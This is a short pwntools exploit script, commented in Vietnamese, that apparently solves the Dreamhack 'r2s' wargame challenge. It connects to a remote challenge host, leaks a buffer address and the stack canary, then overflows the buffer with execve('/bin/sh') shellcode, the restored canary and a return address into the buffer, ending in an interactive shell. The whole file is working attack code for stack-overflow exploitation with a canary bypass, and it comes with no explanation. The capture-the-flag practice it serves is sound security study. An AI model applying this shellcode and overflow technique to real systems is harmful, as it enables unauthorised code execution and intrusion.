from pwn import *

exe = ELF('r2s', checksec = False)
#r = process(exe.path)
r = remote('host3.dreamhack.games', 14646)

### Lấy địa chỉ biến buf
r.recvuntil(b'buf: ')
buf_leak = r.recv(14).decode()
log.info('buf: ' + buf_leak)
buf_leak = int(buf_leak, 16)

#input()
### Leak địa chỉ canary
payload = b'a'*0x59
r.sendafter(b'Input: ', payload)
r.recvuntil(b'a'*0x58)
canary_leak = u64(r.recv(8))
canary_leak = canary_leak - 0x61
log.info('canary: ' + hex(canary_leak))

### Nhập shell và điều hướng
payload = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload = payload.ljust(0x58, b'a')
payload += p64(canary_leak) + b'a'*8 + p64(buf_leak)
r.sendlineafter(b'Input: ', payload)
r.interactive()